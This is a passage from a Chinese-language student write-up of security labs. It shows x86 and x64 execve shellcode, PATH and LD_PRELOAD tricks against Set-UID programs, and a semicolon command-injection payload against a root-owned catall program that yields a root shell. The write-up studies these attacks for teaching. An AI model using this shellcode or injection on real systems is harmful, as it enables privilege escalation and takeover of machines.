edx, [ebx+32]; 获得env[]的地址，存在edx中</span><br><span class="line"></span><br><span class="line">mov [ebx+44], ebx; addr of argv[0]=&quot;/usr/bin/env\0&quot;</span><br><span class="line">mov [ebx+48], eax; argv[1]=0</span><br><span class="line">lea ecx, [ebx+44]; 获得argv[]的地址，存在ecx中</span><br><span class="line"></span><br><span class="line">mov al,  0x0b</span><br><span class="line">int 0x80</span><br><span class="line">two:</span><br><span class="line">call one</span><br><span class="line">db &#x27;/usr/bin/env****&#x27;</span><br><span class="line">db &#x27;a=11****&#x27;</span><br><span class="line">db &#x27;b=22****&#x27;</span><br><span class="line">db &#x27;AAAA&#x27;</span><br><span class="line">db &#x27;BBBB&#x27;</span><br><span class="line">db &#x27;CCCC&#x27;</span><br><span class="line">db &#x27;DDDD&#x27;</span><br><span class="line">db &#x27;EEEE&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序号:  01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52</span><br><span class="line">字符:  /  u  s  r  /  b  i  n  /  e  n  v  *  *  *  *  a  =  1  1  *  *  *  *  b  =  2  2 </span><br><span class="line">*  *  *  *  A  A  A  A  B  B  B  B  C  C  C  C  D  D  D  D  E  E  E  E</span><br></pre></td></tr></table></figure><p><strong>（2’）另附<code>（2）</code>的思路二（a,b当成参数数组的值传入）的代码片段</strong></p><p><strong>代码</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">BITS 32</span><br><span class="line">jmp short two</span><br><span class="line">one:</span><br><span class="line">pop ebx</span><br><span class="line">xor eax, eax</span><br><span class="line"></span><br><span class="line">mov [ebx+12], al  ; &#x27;*&#x27; --&gt; &#x27;\0&#x27;</span><br><span class="line">mov [ebx+14], al</span><br><span class="line">mov [ebx+19], al</span><br><span class="line">mov [ebx+24], al</span><br><span class="line"></span><br><span class="line">mov [ebx+25], ebx  ; AAAA --&gt; &amp;&quot;/usr/bin/env&quot;</span><br><span class="line"></span><br><span class="line">lea ecx, [ebx+13]  ; BBBB --&gt; &amp;&quot;-&quot;</span><br><span class="line">mov [ebx+29], ecx</span><br><span class="line"></span><br><span class="line">lea ecx, [ebx+15]  ; CCCC --&gt; &amp;&quot;a=11&quot;</span><br><span class="line">mov [ebx+33], ecx</span><br><span class="line"></span><br><span class="line">lea ecx, [ebx+20]  ; DDDD --&gt; &amp;&quot;b=22&quot;</span><br><span class="line">mov [ebx+37], ecx</span><br><span class="line"></span><br><span class="line">mov [ebx+41], eax  ; EEEE --&gt; null</span><br><span class="line"></span><br><span class="line">lea ecx, [ebx+25]  ; ecx --&gt; &amp;&quot;/usr/bin/env - a=11 b=22&quot;</span><br><span class="line">xor edx, edx       ; edx --&gt; null</span><br><span class="line"></span><br><span class="line">mov al, 0x0b       ; interrupt</span><br><span class="line">int 0x80</span><br><span class="line"></span><br><span class="line">two:</span><br><span class="line">call one</span><br><span class="line">db &#x27;/usr/bin/env*-*a=11*b=22*AAAABBBBCCCCDDDDEEEE&#x27;</span><br></pre></td></tr></table></figure><h2 id="Task-3-Writing-64-bit-Shellcode"><a href="#Task-3-Writing-64-bit-Shellcode" class="headerlink" title="Task 3: Writing 64-bit Shellcode"></a>Task 3: Writing 64-bit Shellcode</h2><p><strong>分析</strong>：和Task1b的区别就是一个只能传4字节，一个只能传8字节，先传”h”，再传”&#x2F;bin&#x2F;bas”，同样采用移位的方法。前两个参数分别放入rdi和rsi寄存器中，触发execve中断的汇编相应有变化；</p><p><strong>代码</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .text</span><br><span class="line">  global _start</span><br><span class="line">    _start:</span><br><span class="line">      ; The following code calls execve(&quot;/bin/sh&quot;, ...)</span><br><span class="line">      xor rax, rax</span><br><span class="line">      push rax</span><br><span class="line">      </span><br><span class="line">      mov rax, &quot;h#######&quot;</span><br><span class="line">      shl rax, 56         ; 将 &#x27;h&#x27; 左移到最高 8 位</span><br><span class="line">      shr rax, 56         ; 将 &#x27;h&#x27; 恢复到最低 8 位</span><br><span class="line">      push rax</span><br><span class="line">      mov rax, &quot;/bin/bas&quot;</span><br><span class="line">      push rax</span><br><span class="line">      mov rdi, rsp      ; 1st argument</span><br><span class="line">      </span><br><span class="line">      xor rax, rax</span><br><span class="line">      push rax            ; argv[1] = 0</span><br><span class="line">      push rdi            ; argv[0] = &quot;/bin/bash&quot;</span><br><span class="line">      mov rsi, rsp        ; 2nd argument</span><br><span class="line"></span><br><span class="line">      xor  rdx, rdx       ; 3rd argument</span><br><span class="line"></span><br><span class="line">      xor  rax, rax</span><br><span class="line">      mov al, 0x3b        ; execve()</span><br><span class="line">      syscall</span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li><p>调用execve函数时，ebx指向要打开的可执行程序（Filename）（&#x2F;bin&#x2F;sh或&#x2F;usr&#x2F;bin&#x2F;env），ecx指向可执行程序接受的参数数组的地址（参数数组的第一个值通常是程序本身的名称），edx指向传入的环境变量，eax是execve系统调用号（ <code>al = 0x0b，</code>是 <code>execve</code> 系统调用的编号）；</p></li><li><p>函数在堆栈中传参的顺序是代码中相反的参数顺序（从右向左）；函数调用时，返回地址先入栈，然后参数入栈，接着是被调用函数的父函数的ebp地址入栈，最后是局部变量（局部变量的位置会位于栈帧的下方）。不同的参数之间通常通过0来分割（将eax赋成0，push eax）；</p></li><li><p>shellcode的编写是软件漏洞的非常重要的一环，在实际的渗透过程中，即使发现了系统存在栈溢出等可利用的漏洞，但没有一段可利用的shellcode，我们依然无法提权。而在不同的场景下都需要编写不同的shellcode，这些shellcode拥有相同的模板，但具体实现却有很大的不同。在这次实验中，我通过给定的模板，通过更改参数编写了不同用处的shellcode。在shellcode的编写中，经常使用32位汇编的写法，因为64位机器支持32位二进制文件的运行，而32位汇编相较64位较简单，并且已经能满足大部分需求。</p></li></ul><h1 id="Lab6-环境变量与set-uid"><a href="#Lab6-环境变量与set-uid" class="headerlink" title="Lab6-环境变量与set-uid"></a>Lab6-环境变量与set-uid</h1><blockquote><p>printenv查看环境变量，使用export和unset设置和删除环境变量</p><p>父进程继承子进程环境变量</p><p>execve()的调用中，新进程使用null没有环境变量，envrion可传递环境变量</p><p>System()实际调用了execve()函数传递环境变量，新进程获取到了调用进程的环境变量</p><p>Set-uid情况下（特权程序-root权限），由于环境变量会对动态链接库产生影响，LD_LIBRARY_PATH变量被屏蔽了（RUID和EUID不相等时）</p><p>让正常程序以root权限运行恶意代码：将恶意代码编译运行保存→改变文件为特权程序→将恶意程序包含在环境变量PATH（采用“sudo ln -sf &#x2F;bin&#x2F;zsh &#x2F;bin&#x2F;sh”将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh）</p><p>LD_LIBRARY变量的4种情况（环境变量是否能被引用）：</p><p>（1）普通用户，普通程序，正常链接</p><p>（2）特权程序，普通用户，变量被屏蔽</p><p>（3）特权程序，root用户，正常链接</p><p>（4）seed用户的Set-UID程序，seed1用户，变量被屏蔽</p><p>system(command)函数是通过调用”&#x2F;bin&#x2F;sh -c command”完成command指令的，外部指令并不是程序直接执行的，而是先执行shell程序，shell将command作为输入并解析，输入 “aa;&#x2F;bin&#x2F;sh”时，分号后面的指令也被解析并执行了，由此得到了一个root权限的shell。使用execve()函数时，它将整个字符串作为参数，不会调用shell，因此不会发生权限泄露的情况。</p><p>setuid释放root的权限时，没有释放进程已经获得的特权功能（先打开文件再降权），因此释放后其仍然可以进行读写文件，添加内容等。要避免此类能力泄露的问题，可以将setuid(getuid())语句移动到open()函数之前。</p></blockquote><ul><li><strong>环境变量 (Environment Variables)</strong> 是在操作系统中存储配置信息和系统状态的动态值。它们为操作系统和应用程序提供了一种在运行时传递信息的方式。每个进程都可以有自己的环境变量，允许它们在不同的上下文中运行。<br>例：<strong>PATH：</strong> <code>PATH</code> 是一个非常常见的环境变量，它包含了系统用于查找可执行文件的路径列表。当您在命令行中输入一个命令时，系统将在 <code>PATH</code> 中列出的路径中查找该命令的可执行文件。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PATH=/usr/local/bin:/usr/bin:/bin</span><br></pre></td></tr></table></figure><ul><li><strong>set-uid (Set User ID)</strong> 是一种在 Unix 和类 Unix 操作系统中用于设置进程特权级别的机制。通过设置 set-uid 位，一个可执行文件将在执行时获得文件所有者的权限，而不是执行者的权限。这意味着普通用户可以以具有文件所有者权限的身份执行该程序，通常这是超出用户普通权限的操作。</li></ul><h2 id="Task-1-Manipulating-Environment-Variables"><a href="#Task-1-Manipulating-Environment-Variables" class="headerlink" title="Task 1: Manipulating Environment Variables"></a>Task 1: Manipulating Environment Variables</h2><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 16.08.25.png" alt="截屏2025-01-02 16.08.25" style="zoom:50%;" /><h2 id="Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="Task 2: Passing Environment Variables from Parent Process to Child Process"></a>Task 2: Passing Environment Variables from Parent Process to Child Process</h2><p>当子进程被创建时，它会继承父进程的环境变量。这意味着子进程将具有与父进程相同的环境变量，包括相同的变量名称和值。因为 fork() 函数会复制父进程的环境，包括环境变量。</p><blockquote><p>使用<code>diff</code>命令发现父子进程的环境变量相同，说明子进程会继承父进程的环境变量，还包括父进程的堆栈、内存等，但进程id和fork()函数返回值不同</p></blockquote><p><strong>关于environ：</strong></p><p><code>extern char **environ</code>; 是一个在C程序中用于访问环境变量的声明。这个声明用于引用一个全局变量，这个全局变量通常包含了当前进程的环境变量的信息。</p><p>environ 是一个指向指针数组的指针，每个指针指向一个以<code>key=value</code>格式表示的环境变量字符串。</p><p>通过访问 environ 这个全局变量，可以获取当前进程的环境变量列表。</p><blockquote><p>在Unix-like操作系统中，环境变量是一种在操作系统级别用于存储配置信息和参数的机制，它们通常以字符串的键值对形式存在。通过 environ 变量，可以访问这些环境变量并读取它们的值。</p><p>通常，可以通过循环遍历environ 数组，以获取和操作环境变量的值。</p></blockquote><blockquote><p><strong>environ</strong>是一个全局变量，通常用于在C语言中<strong>获取当前进程的环境变量</strong>。它是一个指向字符指针数组的指针，这个字符指针数组中的每个元素都是一个<strong>指向以null结尾的字符串的指针</strong>，表示一个环境变量的键值对，environ[i]获取到了一个字符指针，指向其中某个环境变量，C语言中通过打印字符串指针可以打印出其指向的字符串。<u><em>（联想到edx寄存器存的是指针的指针）</em></u></p><p>该声明使用了<strong>extern</strong>关键字，因此environ变量的定义通常是在操作系统或C运行时库中，而不是在用户程序中。</p></blockquote><h2 id="Task-3-Environment-Variables-and-execve"><a href="#Task-3-Environment-Variables-and-execve" class="headerlink" title="Task 3: Environment Variables and execve()"></a>Task 3: Environment Variables and execve()</h2><p><strong><code>execve()</code>函数</strong>执行参数指定的命令时**<u><em>不会</em></u><strong>产生一个</strong>新进程**（或者一个<strong>新的shell</strong>），而是将被加载的程序的数据和堆栈等覆盖到调用进程上，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/usr/bin/env&quot;</span>, argv, <span class="literal">NULL</span>);<span class="comment">//修改前</span></span><br><span class="line">execve(<span class="string">&quot;/usr/bin/env&quot;</span>, argv, environ);<span class="comment">//修改后</span></span><br></pre></td></tr></table></figure><p><strong>step1：</strong></p><p>我们先不传入环境变量，打印现在环境的环境变量，发现不存在环境变量，说明原有进程的环境变量被覆盖，</p><p>也就是说将 <u><em><strong>envp</strong></em></u> 参数设置为 NULL，execve() 在执行新程序时会清空环境变量，这导致了没有输出。</p><p><strong>step2</strong>：</p><p>然后将<code>execve()</code>函数中的第三个参数envp设为全局变量environ，重新编译并运行，将 envp 参数设置为 <code>environ</code>，</p><p>传入了 environ 变量作为 envp 参数，因此 &#x2F;usr&#x2F;bin&#x2F;env 将继承当前进程的环境变量。在这种情况下，environ 包含当前进程的环境变量，所以 &#x2F;usr&#x2F;bin&#x2F;env 将使用当前进程的环境变量。</p><p><strong>step3：总结</strong></p><blockquote><p><strong><code>execve</code>函数会将传入的环境变量覆盖到原有环境变量上，若没有传入，则环境变量为空</strong></p></blockquote><p>修改前没有输出，修改后能输出环境变量的原因：</p><ol><li><code>extern char **environ;</code>获取环境变量表；</li><li>execve的第三个参数就是传入环境变量的位置；</li></ol><p>execve 函数在执行命令时的环境变量取决于传递给它的 envp 参数。envp 参数是一个指向字符串指针数组的指针，其中包含了新程序执行时的环境变量。这个参数允许你自定义新程序的环境变量。</p><p>具体来说，分析 execve 函数执行命令时的环境变量涉及以下几个方面：</p><ul><li>继承当前进程的环境变量：如果你将 envp 参数设置为 environ，execve 将继承当前进程的环境变量，即当前进程的环境变量将成为新程序的环境变量。这意味着新程序将具有与当前进程相同的环境变量。</li><li>设置自定义环境变量：你可以通过设置 envp 数组来自定义新程序的环境变量。在 envp 中，每个元素都是一个以 key&#x3D;value 格式表示的环境变量字符串。例如，envp[0] &#x3D; “wzh&#x3D;70093”; 将设置一个名为 wzh的环境变量，其值为 70093。</li><li>清除环境变量：如果你不传递 envp 参数（即将其设置为 NULL），新程序将不具有自定义环境变量，而只会使用系统默认的环境变量。</li></ul><p>总之，execve 函数允许你对新程序的环境变量进行精确控制。你可以选择继继承当前进程的环境变量，添加、修改或删除特定的环境变量，或者在不传递 envp 参数的情况下，让新程序使用默认的环境变量。这提供了灵活性，使你能够满足特定应用场景的需求。</p><h2 id="Task-4-Environment-Variables-and-system"><a href="#Task-4-Environment-Variables-and-system" class="headerlink" title="Task 4: Environment Variables and system()"></a>Task 4: Environment Variables and system()</h2><p><code>system()</code>函数也可以用来执行新的程序，与<code>execve()</code>函数不同，system()函数实际上执行<code>/bin/sh -c</code>命令，即打开了一个新的shell，并要求shell执行该命令，</p><p><code>system()</code>会调用<code>fork()</code>函数产生子进程，然后子进程调用<code>/bin/sh -c command</code>来执行传入参数的命令。此命令执行完后随即返回父进程，环境变量从父进程传给了子进程中的shell程序，在shell程序输出了全部的环境变量</p><p><strong>分析</strong>：</p><blockquote><p><code>system(&#39;/usr/bin/env&#39;)</code>调用<code>execl()</code>执行<code>/bin/sh</code>，<code>execl()</code>调用<code>execve()</code>并将环境变量传给它。</p></blockquote><p>system 函数是一个高级接口，它允许执行一个外部命令，并等待该命令完成。</p><p>在system函数的内部，使用了fork创建子进程，然后在子进程中调用<code>execl</code>函数，<code>execl</code>进而调用<code>execve</code>函数，同时把环境变量传递给<code>execve</code>，因为子进程是fork出来的，**所以环境变量与原进程是相同的。**并且父进程也会继续执行，所以<code>printf</code>语句会被执行。</p><p>system 函数用于执行外部命令，并等待其执行完成，环境变量与原程序相同，而 <code>execve</code> 函数用于在当前进程内启动新程序，并控制新程序的环境。</p><h2 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h2><blockquote><p>Set-UID是Unix下的一种安全机制，当该机制下的程序运行时，它将拥有该程序所有者的权限。例如，如果程序的所有者是root，那么当任何人运行此程序时，程序在执行过程中都会获得root的权限，而普通用户运行该程序时就会存在<strong>越权</strong>的漏洞。</p></blockquote><p>一个 Set-UID程序是一个在执行时具有文件所有者的用户权限的程序。这意味着，无论哪个用户运行该程序，它都以程序文件所有者的权限运行。这通常用于允许普通用户执行需要更高特权级别的操作的程序。</p><p>虽然程序的运行轨迹是由程序代码本身的逻辑决定的，但是执行它的用户仍然可以通过改变环境变量的方式来影响程序的运行。</p><p><strong>代码：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 16.32.02.png" alt="截屏2025-01-02 16.32.02" style="zoom:50%;" /><p><strong>为什么shell会fork一个子进程？</strong></p><p>Shell 会 <code>fork</code> 一个子进程来执行你的程序，这是因为 shell 是通过创建子进程来执行外部命令的。</p><blockquote><p>当你在 shell 中运行程序时，通常 shell 会使用 <code>fork</code> 系统调用创建一个新的子进程来执行命令。这是因为 shell 本身不直接执行程序，而是通过创建一个子进程来执行命令。子进程是 shell 的一个副本，运行在独立的内存空间中。</p><p>当你执行带有 <code>setuid</code> 的程序时，它会在子进程中运行，并且该子进程会继承父进程的环境变量。然而，<code>setuid</code> 会影响程序的权限，这使得子进程（以root用户执行）会在执行时可能会受到不同的环境设置。</p></blockquote><p><strong>分析</strong>：</p><blockquote><p>当运行一个<code>Set-UID </code>程序时，环境变量 <code>LD_LIBRARY_PATH </code>通常不会被继承。这是因为 <code>Set-UID</code> 程序是以文件所有者的权限来执行的，而不是调用者的权限，为了增加安全性，系统通常会限制一些环境变量的继承，以避免潜在的滥用和安全漏洞。</p><p>特别是，<code>LD_LIBRARY_PATH</code> 是一个环境变量，用于指定动态链接器查找共享库的路径。如果它被继承，那么恶意用户可能会设置一个恶意的<code> LD_LIBRARY_PATH</code>，以引导程序加载恶意共享库，从而引发安全漏洞。</p><p>因此，在安全性考虑下，系统通常会限制 <code>Set-UID</code> 程序对 <code>LD_LIBRARY_PATH</code> 的继承。这意味着<code>Set-UID</code>程序将使用默认的共享库路径，而不是根据 <code>LD_LIBRARY_PATH</code> 进行动态库加载。</p></blockquote><p>这是一种<strong>动态链接器的保护策略</strong>，因为这个程序用到了动态链接库。我们是在seed用户的状态下修改的<code>LD_LIBRARY_PATH</code>，在<code>Set-UID</code>的机制下，对动态链接相关环境变量的修改不能被传递到可执行程序中，这是为了抵御修改<code>LD_LIBRARY_PATH</code>来改变<code>set-uid</code>程序的库来实施攻击的攻击方法。动态链接器在<code>effective uid（root）</code>和<code>real uid(seed)</code>不一致时，会将<code>LD_LIBRARY_PATH</code>和<code>LD_PRELOAD</code>环境变量忽略掉，所以子进程是看不到的，即父进程中设置的环境变量未能进入到子进程中。而环境变量<code>PATH</code>以及<code>ANY_NAME</code>与动态链接器无关，没有被屏蔽，所以子进程能够看到，即父进程中设置的环境变量能进入到子进程中。</p><h2 id="Task-6-The-PATH-Environment-Variable-and-SetUID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-SetUID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and SetUID Programs"></a>Task 6: The PATH Environment Variable and SetUID Programs</h2><p><strong>要求</strong>：</p><ul><li><p>在原有PATH变量首部添加<code>/home/seed</code>路径：<code> export PATH=/home/seed:$PATH</code>，寻找命令时会优先选择靠前的。</p></li><li><p>关闭保护措施：<code>sudo ln -sf /bin/zsh /bin/sh</code></p></li><li><p>新建两个文件并编译。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//task6.c 真的调用ls命令，编译为task6，修改权限类似task5</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//fakels.c 恶意代码，编译为ls(放在/home/seed/路径下)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you are in fake ls!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 16.35.35.png" alt="截屏2025-01-02 16.35.35" style="zoom:50%;" /><p><strong>分析：</strong></p><p><u>因为system()函数运行的命令的环境变量与原程序相同，所以改变原程序的PATH可以影响system()函数的运行环境，进而改变程序的行为。</u></p><p>当运行 ls 命令时，系统会在 PATH 中从上到下（优先选择靠前的）指定的目录中查找 ls 命令的可执行文件。如果 ls 可执行文件存在于 PATH 中的某个目录中，系统就会执行该文件。在本次task中，PATH中的第一个值是<code>/home/seed</code>，那么系统就会先在改目录寻找ls，所以系统会执行当前目录下的ls，而不会执行<code>/usr/bin/ls</code>。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 16.37.50.png" alt="截屏2025-01-02 16.37.50" style="zoom:50%;" /><h2 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h2><p><strong><code>gcc -fPIC -g -c mylib.c</code></strong>：<u>编译源代码文件mylib.c，生成目标文件mylib.o</u>。选项-fPIC表示生成位置无关的代码（Position Independent Code）以便编译器能够在不同地址空间中执行该代码。选项-g表示生成调试信息，以便能够使用调试器来调试该代码。</p><p><strong><code>gcc -shared -o libmylib.so.1.0.1 mylib.o -lc</code></strong>：<u>将目标文件mylib.o链接成一个动态链接库<code>libmylib.so.1.0.1</code>。</u>选项 <strong>-shared</strong>表示生成动态链接库，选项 -o指定输出文件名。<strong>-lc</strong>选项表示动态链接库需要链接C运行时库，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_PRELOAD=./libmylib.so.1.0.1</span><br></pre></td></tr></table></figure><p>环境变量<code>LD_PRELOAD</code>用于在程序运行时强制优先加载指定的共享库文件。这个功能可以用来替换已经存在的库中的函数或者添加新的函数，修改这个环境变量到我们的动态链接库，</p><p><strong>总结</strong>：</p><ul><li>普通程序+普通用户：seed用户已经拥有<code>LD_PRELOAD</code>环境变量，输出<code>I am not sleeping! </code>；</li><li>root程序+普通用户：sleep 1秒（进程ID与当前用户ID不一致时，忽略<code>LD_PRELOAD</code>环境变量）；</li><li>root程序+<code>LD_PRELOAD</code>环境(root），输出<code>I am not sleeping! </code>；</li><li>user1程序+<code>LD_PRELOAD</code>环境(user2)：<ul><li>seed用户编译程序后将权限改为wuzh用户；</li><li>seed用户导入环境变量后执行，sleep1s（进程ID与当前用户ID不一致时，忽略<code>LD_PRELOAD</code>环境变量）。</li></ul></li></ul><blockquote><p>是否能成功链接到我们的库取决于我们设置的<code>LD_PRELOAD</code>环境变量有没有被动态连接器屏蔽.</p><p>当执行环境的用户ID（EID）和程序的用户ID（UID）不一致时，动态链接器出于安全考虑，会将环境变量的改变屏蔽掉，因此我们设置的环境变量不会生效。</p></blockquote><p><strong>结论</strong>：未成功调用我们自定义的sleep函数的原因就是<code>LD_PRELOAD</code>并没有继承到子程序中（Shell 会 <code>fork</code> 一个子进程来执行你的程序，这是因为 shell 是通过创建子进程来执行外部命令的）。<code>LD_PRELOAD</code>环境变量让链接器将sleep()函数和用户的代码链接起来，将该环境变量加入新的共享库，程序会调用用户的sleep()函数，输出<code>I am not sleeping! </code>。但是当<u><strong>进程的真实用户ID和有效用户ID不一致</strong></u>时，fork的子进程忽略<code>LD_PRELOAD</code>环境变量而不继承。因此第二个和第四个的sleep没有被替换。</p><h2 id="Task-8-Invoking-External-Programs-Using-system-versus-execve"><a href="#Task-8-Invoking-External-Programs-Using-system-versus-execve" class="headerlink" title="Task 8: Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h2><p>虽然system()和execve()都可以用来运行新程序，但是如果在特权程序中使用system()是相当危险的，例如Set-UID程序。我们已经看到 PATH 环境变量如何影响 system() 的行为，因为PATH会影响 shell 的工作方式。 execve() 就没有问题，因为它不调用 shell。调用 shell 还有另一个危险的后果，这次，它与环境变量无关。</p><h3 id="8-1-system（）"><a href="#8-1-system（）" class="headerlink" title="8.1. system（）"></a>8.1. system（）</h3><p><strong>catall.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v[<span class="number">3</span>];</span><br><span class="line">  <span class="type">char</span> *command;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please type a file name.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  v[<span class="number">0</span>] = <span class="string">&quot;/bin/cat&quot;</span>; v[<span class="number">1</span>] = argv[<span class="number">1</span>]; v[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  command = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(v[<span class="number">0</span>]) + <span class="built_in">strlen</span>(v[<span class="number">1</span>]) + <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(command, <span class="string">&quot;%s %s&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use only one of the followings.</span></span><br><span class="line">  system(command);</span><br><span class="line">  <span class="comment">// execve(v[0], v, NULL);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读代码<code>catall.c</code>会发现，主要问题在于这段代码使用 sprintf 将命令构建为一个字符串，而没有对参数进行任何验证或过滤。从而我们可以提供提供恶意的文件名，比如使用分号或者管道符号分割，使得程序可以执行我们指定的命令。例如获得ROOT shell。</p><p>输入命令如下，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./catall <span class="string">&quot;/home/seed/Desktop/lab6/task8.txt;/bin/zsh&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>在catall执行后的参数中写入两条shell语句，以”;”作为分隔，system()函数拿到字符串后会直接将其作为整个shell命令去执行；</p><p>发现程序运行了<code>/bin/zsh</code>命令，这是因为catall是一个root权限的文件，执行时具有root权限，这里就发生了<strong>普通用户执行root程序的越权行为</strong></p></blockquote><p>使用分号将&#x2F;bin&#x2F;zsh命令隔开，system也会处理&#x2F;bin&#x2F;zsh命令，唤起一个shell，又因为catall程序是一个Set-UID程序，所以可以唤起一个ROOT shell，这样即可随意对系统文件进行修改。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 17.10.50.png" alt="截屏2025-01-02 17.10.50" style="zoom:33%;" /><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 17.11.03.png" alt="截屏2025-01-02 17.11.03" style="zoom:33%;" /><h3 id="8-2-execve（）"><a href="#8-2-execve（）" class="headerlink" title="8.2. execve（）"></a>8.2. execve（）</h3><p>尝试执行命令,</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./catall <span class="string">&quot;/home/seed/Desktop/lab6/task8.txt;/bin/zsh&quot;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-02 17.14.32.png" alt="截屏2025-01-02 17.14.32" style="zoom:33%;" /><p>发现execve无法识别为两条命令，</p><p>换成<code>execve()</code>函数，发现无法执行，原因是<code>execve()</code>函数并不会启动一个shell，传入的字符串整个作为一个参数去执行，自然会报无法找到这个程序&#x2F;命令的错误，</p><h3 id="8-3-总结"><a href="#8-3-总结" class="headerlink" title="8.3.总结"></a>8.3.总结</h3><ul><li>system(command) 使用一个字符串变量 command 来构建整个命令行，这意味着可以在 command 中编写完整的命令，包括命令和参数。这使得 system 更容易使用，但也更容易受到命令注入攻击的威胁。</li><li>execve(v[0], v, NULL) 使用一个参数数组 v 来指定可执行文件和其参数。这种方式更加安全，因为参数是在数组中明确指定的，而不是从一个字符串中解析。这有助于防止命令注入攻击。</li></ul><p>简而言之，execve比system更安全。</p><h2 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h2><p>Set-UID 